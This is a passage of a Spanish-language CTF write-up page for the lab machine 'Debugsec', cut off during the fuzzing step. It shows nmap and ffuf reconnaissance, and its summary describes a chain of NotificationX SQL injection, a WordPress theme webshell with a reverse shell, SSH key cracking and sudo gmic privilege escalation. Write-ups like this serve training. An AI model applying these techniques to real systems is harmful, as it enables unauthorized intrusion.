@@ -1,0 +1,1306 @@
+<!DOCTYPE html>
+<html lang="es-MX">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Debugsec - TheHackerLabs · BerserkWings - Hacking Ético</title>
+<meta name="description" content="Writeups de ciberseguridad, CTFs, Active Directory y certificaciones.">
+
+<meta http-equiv="Content-Security-Policy"
+      content="default-src 'self';
+               img-src 'self';
+               style-src 'self' 'unsafe-inline' https://fonts.googleapis.com;
+               font-src 'self' https://fonts.gstatic.com;
+               script-src 'self' ;
+               connect-src 'self' ;
+               object-src 'none';
+               base-uri 'self';
+               form-action 'self';
+               upgrade-insecure-requests;">
+<meta name="referrer" content="strict-origin-when-cross-origin">
+
+<link rel="canonical" href="http://localhost:1313/THL-writeup-debugsec/">
+<link rel="icon" href="/assets/images/favicon.png">
+
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Chakra+Petch:wght@500;600;700&family=Inter:wght@400;500&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+
+
+<link rel="stylesheet" href="/css/main.min.b51fce260bd224cda026ea0223adf133e0ce779edbb6c14d513c3f101c33a9ff.css" integrity="sha256-tR/OJgvSJM2gJuoCI63xM&#43;DOd57btsFNUTw/EBwzqf8=">
+
+
+<meta property="og:title" content="Debugsec - TheHackerLabs">
+<meta property="og:description" content="Writeups de ciberseguridad, CTFs, Active Directory y certificaciones.">
+<meta property="og:type" content="article">
+<meta property="og:image" content="http://localhost:1313/assets/images/THL-writeup-debugsec/debugsec.png">
+
+
+
+</head>
+<body>
+  <header class="site-header">
+  <div class="wrap">
+    <a class="brand" href="/">
+      
+      <img class="brand-logo" src="http://localhost:1313/assets/images/masthead.png" alt="BerserkWings">
+      
+    </a>
+    <nav class="main-nav">
+      
+        <a href="/" >Inicio</a>
+      
+        <a href="/posts/" >Writeups</a>
+      
+        <a href="/categories/" >Categorías</a>
+      
+        <a href="/tags/" >Etiquetas</a>
+      
+        <a href="/buscador/" >Buscador</a>
+      
+        <a href="/acerca-de-mi/" >Acerca de mí</a>
+      
+    </nav>
+  </div>
+</header>
+
+  <main>
+    
+<canvas class="hero-matrix-bg hero-matrix-bg--dim" id="heroMatrixBg" aria-hidden="true"></canvas>
+<article class="post" id="top">
+  
+
+
+
+
+<aside class="side-profile">
+  <img class="side-avatar" src="http://localhost:1313/assets/images/avatar.png" alt="BerserkWings">
+  <div class="side-name">BerserkWings</div>
+  <div class="side-tagline">Aspirante a Pentester · CTF Player</div>
+
+  
+  <div class="side-platforms">
+    <span class="side-platform-badge">HTB: BerserkWings</span>
+    <span class="side-platform-badge">THL: BerserkWings</span>
+  </div>
+  
+
+  <div class="side-contact">
+    <span class="side-meta">📍 México</span>
+    
+    <a class="side-meta-link" href="https://github.com/BerserkWings" target="_blank" rel="noopener noreferrer">🔗 GitHub</a>
+    
+  </div>
+
+  
+  <div class="side-posts">
+    <div class="side-post-cards">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+        
+        
+        
+        
+        
+        <a class="side-post-card" href="http://localhost:1313/THL-writeup-cachopo/">
+          <span class="side-post-card-title">Cachopo</span>
+          <span class="side-post-card-platform">TheHackerLabs</span>
+        </a>
+        
+        
+      
+        
+        
+        
+        
+        
+        
+        <a class="side-post-card" href="http://localhost:1313/THL-writeup-bocataCalamares/">
+          <span class="side-post-card-title">Bocata de Calamares</span>
+          <span class="side-post-card-platform">TheHackerLabs</span>
+        </a>
+        
+        
+      
+        
+        
+        
+        
+        
+        
+        <div class="side-post-card is-current">
+          <span class="side-post-card-title">Debugsec</span>
+          <span class="side-post-card-platform">TheHackerLabs</span>
+        </div>
+        
+        
+      
+        
+        
+        
+        
+        
+        
+        <a class="side-post-card" href="http://localhost:1313/THL-writeup-campanaFeliz/">
+          <span class="side-post-card-title">Campana Feliz</span>
+          <span class="side-post-card-platform">TheHackerLabs</span>
+        </a>
+        
+        
+      
+        
+        
+        
+        
+        
+        
+        <a class="side-post-card" href="http://localhost:1313/THL-writeup-huevosFritos/">
+          <span class="side-post-card-title">Huevos Fritos</span>
+          <span class="side-post-card-platform">TheHackerLabs</span>
+        </a>
+        
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+  </div>
+  
+
+  
+
+  
+
+
+</aside>
+
+
+  
+  
+  
+
+  <header class="post-header">
+    
+    <div class="post-meta">TheHackerLabs / Medium Machine</div>
+    
+    <h1>Debugsec - TheHackerLabs</h1>
+    <div class="post-meta">22 July 2025 · 15 min de lectura</div>
+  </header>
+
+  
+  <img class="post-cover" src="http://localhost:1313/assets/images/THL-writeup-debugsec/debugsec.png" alt="Debugsec - TheHackerLabs">
+  
+
+  
+  <p class="post-lead">Esta fue una máquina un poco complicada. Después de analizar los escaneos, descubrimos que la página web activa del puerto 80, está utilizando Virtual Hosting, por lo que agregamos la IP y el dominio al /etc/hosts para que nos cargue bien la página. Ya en la página, vemos que fue hecha con WordPress y que solo tiene un usuario registrado, así que utilizamos WPScan para enumerarla y encontrar algún plugin que sea utilizado y sea vulnerable. Resulta que la página utiliza el plugin NotificarionX versión 2.8.2, que es vulnerable a Unauthenticated Blind SQL Injection. Investigando un poco, encontramos un Exploit en la página web de Vicarius que usamos para obtener el hash del administrador del sitio, mismo hash que logramos crackear con JohnTheRipper y usando al usuario que ya habíamos encontrado antes, logramos ganar acceso al login de WordPress. Dentro del login, modificamos el archivo PHP de un tema para que nos sirva como WebShell y nos podamos mandar una Reverse Shell, ganando acceso principal a la máquina víctima. Ya en la máquina víctima, descubrimos una llave privada id_rsa de un usuario, que logramos crackear y usar para ganar acceso a la máquina víctima vía SSH. Autenticados como el usuario de la máquina, vemos que tiene privilegios sudoers de Root sobre el binario gmic. Pues dicho binario permite la ejecución de comandos, así que solamente le indicamos que nos dé una sesión de Bash y la obtenemos, pero como Root, logrando escalar privilegios.</p>
+  
+
+  
+  <details class="post-tools">
+    <summary>🛠 Herramientas utilizadas</summary>
+
+    
+      
+      <ul><li><code>ping</code></li><li><code>nmap</code></li><li><code>wappalizer</code></li><li><code>ffuf</code></li><li><code>gobuster</code></li><li><code>wpscan</code></li><li><code>python3</code></li><li><code>JohnTheRipper</code></li><li><code>nc</code></li><li><code>bash</code></li><li><code>cat</code></li><li><code>grep</code></li><li><code>chmod</code></li><li><code>ssh2john</code></li><li><code>ssh</code></li><li><code>sudo</code></li></ul>
+    
+  </details>
+  
+
+  
+  <details class="toc" id="indice" open>
+    <summary>📑 Índice</summary>
+    <nav>
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#Recopilacion">Recopilación de Información</a>
+      <ul>
+        <li><a href="#Ping">Traza ICMP</a></li>
+        <li><a href="#Puertos">Escaneo de Puertos</a></li>
+        <li><a href="#Servicios">Escaneo de Servicios</a></li>
+      </ul>
+    </li>
+    <li><a href="#Analisis">Análisis de Vulnerabilidades</a>
+      <ul>
+        <li><a href="#HTTP">Analizando Servicio HTTP</a></li>
+        <li><a href="#fuzz">Fuzzing</a></li>
+        <li><a href="#WPScan">Enumeración de WordPress con WPScan</a></li>
+      </ul>
+    </li>
+    <li><a href="#Explotacion">Explotación de Vulnerabilidades</a>
+      <ul>
+        <li><a href="#Exploit">Probando Exploit: Unauthenticated blind SQLi in NotificationX WordPress plugin - CVE-2024-1698</a></li>
+        <li><a href="#WebShell">Modificando Tema con Editor de Temas para Crear WebShell y Ganando Acceso a la Máquina</a></li>
+      </ul>
+    </li>
+    <li><a href="#Post">Post Explotación</a>
+      <ul>
+        <li><a href="#linEnum">Enumeración de la Máquina Víctima y Crackeo de Llave Privada id_rsa</a></li>
+        <li><a href="#gmic">Escalando Privilegios Abusando de los Privilegios Sudoers sobre Binario gmic</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+      <ul><li><a href="#links-de-investigacion">Links de investigación</a></li></ul>
+    </nav>
+  </details>
+  <aside class="side-toc">
+    <div class="side-toc-header">📑 Índice</div>
+    <nav>
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#Recopilacion">Recopilación de Información</a>
+      <ul>
+        <li><a href="#Ping">Traza ICMP</a></li>
+        <li><a href="#Puertos">Escaneo de Puertos</a></li>
+        <li><a href="#Servicios">Escaneo de Servicios</a></li>
+      </ul>
+    </li>
+    <li><a href="#Analisis">Análisis de Vulnerabilidades</a>
+      <ul>
+        <li><a href="#HTTP">Analizando Servicio HTTP</a></li>
+        <li><a href="#fuzz">Fuzzing</a></li>
+        <li><a href="#WPScan">Enumeración de WordPress con WPScan</a></li>
+      </ul>
+    </li>
+    <li><a href="#Explotacion">Explotación de Vulnerabilidades</a>
+      <ul>
+        <li><a href="#Exploit">Probando Exploit: Unauthenticated blind SQLi in NotificationX WordPress plugin - CVE-2024-1698</a></li>
+        <li><a href="#WebShell">Modificando Tema con Editor de Temas para Crear WebShell y Ganando Acceso a la Máquina</a></li>
+      </ul>
+    </li>
+    <li><a href="#Post">Post Explotación</a>
+      <ul>
+        <li><a href="#linEnum">Enumeración de la Máquina Víctima y Crackeo de Llave Privada id_rsa</a></li>
+        <li><a href="#gmic">Escalando Privilegios Abusando de los Privilegios Sudoers sobre Binario gmic</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+      <ul><li><a href="#links-de-investigacion">Links de investigación</a></li></ul>
+    </nav>
+  </aside>
+  
+
+  <div class="post-content">
+    <h2 id="Recopilacion">Recopilación de Información</h2>
+<h3 id="Ping">Traza ICMP</h3>
+<p>Vamos a realizar un ping para saber si la máquina está activa y en base al TTL veremos que SO opera en la máquina.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ping -c <span style="color:#ae81ff">4</span> 192.168.10.210
+</span></span><span style="display:flex;"><span>PING 192.168.10.210 <span style="color:#f92672">(</span>192.168.10.210<span style="color:#f92672">)</span> 56<span style="color:#f92672">(</span>84<span style="color:#f92672">)</span> bytes of data.
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">64</span> bytes from 192.168.10.210: icmp_seq<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span> ttl<span style="color:#f92672">=</span><span style="color:#ae81ff">64</span> time<span style="color:#f92672">=</span>4.69 ms
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">64</span> bytes from 192.168.10.210: icmp_seq<span style="color:#f92672">=</span><span style="color:#ae81ff">2</span> ttl<span style="color:#f92672">=</span><span style="color:#ae81ff">64</span> time<span style="color:#f92672">=</span>0.684 ms
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">64</span> bytes from 192.168.10.210: icmp_seq<span style="color:#f92672">=</span><span style="color:#ae81ff">3</span> ttl<span style="color:#f92672">=</span><span style="color:#ae81ff">64</span> time<span style="color:#f92672">=</span>1.26 ms
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">64</span> bytes from 192.168.10.210: icmp_seq<span style="color:#f92672">=</span><span style="color:#ae81ff">4</span> ttl<span style="color:#f92672">=</span><span style="color:#ae81ff">64</span> time<span style="color:#f92672">=</span>0.922 ms
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>--- 192.168.10.210 ping statistics ---
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">4</span> packets transmitted, <span style="color:#ae81ff">4</span> received, 0% packet loss, time 3036ms
+</span></span><span style="display:flex;"><span>rtt min/avg/max/mdev <span style="color:#f92672">=</span> 0.684/1.890/4.693/1.631 ms
+</span></span></code></pre></div><p>Por el TTL sabemos que la máquina usa <strong>Linux</strong>, hagamos los escaneos de puertos y servicios.</p>
+<h3 id="Puertos">Escaneo de Puertos</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -p- --open -sS --min-rate <span style="color:#ae81ff">5000</span> -vvv -n -Pn 192.168.10.210 -oG allPorts
+</span></span><span style="display:flex;"><span>Host discovery disabled <span style="color:#f92672">(</span>-Pn<span style="color:#f92672">)</span>. All addresses will be marked <span style="color:#e6db74">&#39;up&#39;</span> and scan times may be slower.
+</span></span><span style="display:flex;"><span>Starting Nmap 7.95 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2025-07-22 11:32 CST
+</span></span><span style="display:flex;"><span>Initiating ARP Ping Scan at 11:32
+</span></span><span style="display:flex;"><span>Scanning 192.168.10.210 <span style="color:#f92672">[</span><span style="color:#ae81ff">1</span> port<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>Completed ARP Ping Scan at 11:32, 0.08s elapsed <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> total hosts<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Initiating SYN Stealth Scan at 11:32
+</span></span><span style="display:flex;"><span>Scanning 192.168.10.210 <span style="color:#f92672">[</span><span style="color:#ae81ff">65535</span> ports<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>Discovered open port 22/tcp on 192.168.10.210
+</span></span><span style="display:flex;"><span>Discovered open port 80/tcp on 192.168.10.210
+</span></span><span style="display:flex;"><span>Completed SYN Stealth Scan at 11:32, 8.61s elapsed <span style="color:#f92672">(</span><span style="color:#ae81ff">65535</span> total ports<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 192.168.10.210
+</span></span><span style="display:flex;"><span>Host is up, received arp-response <span style="color:#f92672">(</span>0.00056s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Scanned at 2025-07-22 11:32:24 CST <span style="color:#66d9ef">for</span> 8s
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">65533</span> closed tcp ports <span style="color:#f92672">(</span>reset<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>PORT   STATE SERVICE REASON
+</span></span><span style="display:flex;"><span>22/tcp open  ssh     syn-ack ttl <span style="color:#ae81ff">64</span>
+</span></span><span style="display:flex;"><span>80/tcp open  http    syn-ack ttl <span style="color:#ae81ff">64</span>
+</span></span><span style="display:flex;"><span>MAC Address: XX <span style="color:#f92672">(</span>PCS Systemtechnik/Oracle VirtualBox virtual NIC<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Read data files from: /usr/share/nmap
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 8.87 seconds
+</span></span><span style="display:flex;"><span>           Raw packets sent: <span style="color:#ae81ff">65536</span> <span style="color:#f92672">(</span>2.884MB<span style="color:#f92672">)</span> | Rcvd: <span style="color:#ae81ff">65536</span> <span style="color:#f92672">(</span>2.621MB<span style="color:#f92672">)</span>
+</span></span></code></pre></div><table>
+	<thead>
+			<tr>
+					<th>Parámetros</th>
+					<th>Descripción</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td><em>-p-</em></td>
+					<td>Para indicarle un escaneo en ciertos puertos.</td>
+			</tr>
+			<tr>
+					<td><em>&ndash;open</em></td>
+					<td>Para indicar que aplique el escaneo en los puertos abiertos.</td>
+			</tr>
+			<tr>
+					<td><em>-sS</em></td>
+					<td>Para indicar un TCP Syn Port Scan para que nos agilice el escaneo.</td>
+			</tr>
+			<tr>
+					<td><em>&ndash;min-rate</em></td>
+					<td>Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000).</td>
+			</tr>
+			<tr>
+					<td><em>-vvv</em></td>
+					<td>Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo.</td>
+			</tr>
+			<tr>
+					<td><em>-n</em></td>
+					<td>Para indicar que no se aplique resolución dns para agilizar el escaneo.</td>
+			</tr>
+			<tr>
+					<td><em>-Pn</em></td>
+					<td>Para indicar que se omita el descubrimiento de hosts.</td>
+			</tr>
+			<tr>
+					<td><em>-oG</em></td>
+					<td>Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts.</td>
+			</tr>
+	</tbody>
+</table>
+<p>Veo solo dos puertos abiertos, por lo que es seguro que la intrusión será por la página web activa en el <strong>puerto 80</strong>.</p>
+<h3 id="Servicios">Escaneo de Servicios</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -sCV -p 22,80 192.168.10.210 -oN targeted
+</span></span><span style="display:flex;"><span>Starting Nmap 7.95 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2025-07-22 11:32 CST
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 192.168.10.210
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.00085s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PORT   STATE SERVICE VERSION
+</span></span><span style="display:flex;"><span>22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 <span style="color:#f92672">(</span>protocol 2.0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>| ssh-hostkey: 
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> 14:f7:d8:c3:33:07:81:51:da:fa:bf:4c:03:51:2a:94 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_  <span style="color:#ae81ff">256</span> 4d:2a:b5:82:f5:f0:88:3d:75:9d:f3:fe:27:30:a6:f8 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>80/tcp open  http    Apache httpd 2.4.59 <span style="color:#f92672">((</span>Debian<span style="color:#f92672">))</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>|_http-server-header: Apache/2.4.59 <span style="color:#f92672">(</span>Debian<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_http-title: Did not follow redirect to http://debugsec.thl/
+</span></span><span style="display:flex;"><span>MAC Address: XX <span style="color:#f92672">(</span>PCS Systemtechnik/Oracle VirtualBox virtual NIC<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 9.68 seconds
+</span></span></code></pre></div><table>
+	<thead>
+			<tr>
+					<th>Parámetros</th>
+					<th>Descripción</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td><em>-sC</em></td>
+					<td>Para indicar un lanzamiento de scripts básicos de reconocimiento.</td>
+			</tr>
+			<tr>
+					<td><em>-sV</em></td>
+					<td>Para identificar los servicios/versión que están activos en los puertos que se analicen.</td>
+			</tr>
+			<tr>
+					<td><em>-p</em></td>
+					<td>Para indicar puertos específicos.</td>
+			</tr>
+			<tr>
+					<td><em>-oN</em></td>
+					<td>Para indicar que el output se guarde en un fichero. Lo llame targeted.</td>
+			</tr>
+	</tbody>
+</table>
+<p>El escaneo nos está diciendo que la página nos redirige a un dominio llamado <strong>degubsec.thl</strong>, por lo que seguramente se está aplicando <strong>Virtual Hosting</strong>.</p>
+<p>Puedes registrarlo de una vez en el <code>/etc/hosts</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;192.168.10.210 debugsec.thl&#34;</span> &gt;&gt; /etc/hosts
+</span></span></code></pre></div><p>Ahora sí, visitemos la página.</p>
+<h2 id="Analisis">Análisis de Vulnerabilidades</h2>
+<h3 id="HTTP">Analizando Servicio HTTP</h3>
+<p>Entremos:</p>
+<p align="center">
+<img src="/assets/images/THL-writeup-debugsec/Captura1.png">
+</p>
+<p>Nos carga bien. Si no hubiéramos registrado el dominio en el <code>/etc/hosts</code>, no podríamos ver la página.</p>
+<p>Parece ser una página hecha en <strong>WordPress</strong>.</p>
+<p>Veamos qué nos dice <strong>Wappalizer</strong>:</p>
+<p align="center">
+<img src="/assets/images/THL-writeup-debugsec/Captura2.png">
+</p>
+<p>Bien, nos está dando la versión de <strong>WordPress</strong> siendo la <strong>6.3.4</strong>.</p>
+<p>Revisando un poco la página, encontramos una publicación y solamente aparece un usuario llamado <strong>wordpress</strong>:</p>
+<p align="center">
+<img src="/assets/images/THL-writeup-debugsec/Captura3.png">
+</p>
+<p align="center">
+<img src="/assets/images/THL-writeup-debugsec/Captura4.png">
+</p>
+<p>No encontraremos algo más.</p>
+<p>Vamos a aplicar <strong>Fuzzing</strong> por si hay algo oculto por ahí.</p>
+<h3 id="fuzz">Fuzzing</h3>
+<p>Primero, usaremos la herramienta <strong>ffuf</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u http://192.168.10.210/FUZZ -t <span style="color:#ae81ff">300</span> -e .php,.txt,.html
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        /<span style="color:#e6db74">&#39;___\  /&#39;</span>___<span style="color:#ae81ff">\ </span>          /<span style="color:#960050;background-color:#1e0010">&#39;</span>___<span style="color:#ae81ff">\ </span>      
+</span></span><span style="display:flex;"><span>       /<span style="color:#ae81ff">\ \_</span>_/ /<span style="color:#ae81ff">\ \_</span>_/  __  __  /<span style="color:#ae81ff">\ \_</span>_/       
+</span></span><span style="display:flex;"><span>       <span style="color:#ae81ff">\ \ </span>,__<span style="color:#ae81ff">\\</span> <span style="color:#ae81ff">\ </span>,__<span style="color:#ae81ff">\/\ \/\ \ \ \ </span>,__<span style="color:#ae81ff">\ </span>     
+</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">\ \ \_</span>/ <span style="color:#ae81ff">\ \ \_</span>/<span style="color:#ae81ff">\ \ \_\ \ \ \ \_</span>/      
+</span></span><span style="display:flex;"><span>         <span style="color:#ae81ff">\ \_\ </span>  <span style="color:#ae81ff">\ \_\ </span> <span style="color:#ae81ff">\ \_</span>___/  <span style="color:#ae81ff">\ \_\ </span>      
+</span></span><span style="display:flex;"><span>          <span style="color:#ae81ff">\/</span>_/    <span style="color:#ae81ff">\/</span>_/   <span style="color:#ae81ff">\/</span>___/    <span style="color:#ae81ff">\/</span>_/       
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>       v2.1.0-dev
+</span></span><span style="display:flex;"><span>________________________________________________
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> :: Method           : GET
+</span></span><span style="display:flex;"><span> :: URL              : http://192.168.10.210/FUZZ
+</span></span><span style="display:flex;"><span> :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+</span></span><span style="display:flex;"><span> :: Extensions       : .php .txt .html 
+</span></span><span style="display:flex;"><span> :: Follow redirects : false
+</span></span><span style="display:flex;"><span> :: Calibration      : false
+</span></span><span style="display:flex;"><span> :: Timeout          : <span style="color:#ae81ff">10</span>
+</span></span><span style="display:flex;"><span> :: Threads          : <span style="color:#ae81ff">300</span>
+</span></span><span style="display:flex;"><span> :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+</span></span><span style="display:flex;"><span>________________________________________________
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>wp-content              <span style="color:#f92672">[</span>Status: 301, Size: 323, Words: 20, Lines: 10, Duration: 2ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>wp-login.php            <span style="color:#f92672">[</span>Status: 200, Size: 7568, Words: 359, Lines: 116, Duration: 422ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>index.php               <span style="color:#f92672">[</span>Status: 200, Size: 34459, Words: 1294, Lines: 260, Duration: 3092ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>license.txt             <span style="color:#f92672">[</span>Status: 200, Size: 19915, Words: 3331, Lines: 385, Duration: 21ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>wp-includes             <span style="color:#f92672">[</span>Status: 301, Size: 324, Words: 20, Lines: 10, Duration: 4ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>readme.html             <span style="color:#f92672">[</span>Status: 200, Size: 7399, Words: 750, Lines: 98, Duration: 5ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>wp-admin                <span style="color:#f92672">[</span>Status: 301, Size: 321, Words: 20, Lines: 10, Duration: 38ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>xmlrpc.php              <span style="color:#f92672">[</span>Status: 405, Size: 42, Words: 6, Lines: 1, Duration: 501ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>.php                    <span style="color:#f92672">[</span>Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 20ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>.html                   <span style="color:#f92672">[</span>Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 21ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">[</span>Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 183ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>wp-signup.php           <span style="color:#f92672">[</span>Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 100ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>server-status           <span style="color:#f92672">[</span>Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 38ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>:: Progress: <span style="color:#f92672">[</span>882180/882180<span style="color:#f92672">]</span> :: Job <span style="color:#f92672">[</span>1/1<span style="color:#f92672">]</span> :: <span style="color:#ae81ff">145</span> req/sec :: Duration: <span style="color:#f92672">[</span>0:05:34<span style="color:#f92672">]</span> :: Errors: <span style="color:#ae81ff">0</span> ::
+</span></span></code></pre></div><table>
+	<thead>
+			<tr>
+					<th>Parámetros</th>
+					<th>Descripción</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td><em>-w</em></td>
+					<td>Para indicar el diccionario a usar en el fuzzing.</td>
+			</tr>
+			<tr>
+					<td><em>-u</em></td>
+					<td>Para indicar la URL a utilizar.</td>
+			</tr>
+			<tr>
+					<td><em>-t</em></td>
+					<td>Para indicar la cantidad de hilos a usar.</td>
+			</tr>
+			<tr>
+					<td><em>-e</em></td>
+					<td>Para indicar extensiones de archivos a buscar.</td>
+			</tr>
+	</tbody>
+</table>
+<p>Ahora probemos con <strong>gobuster</strong>:</p>
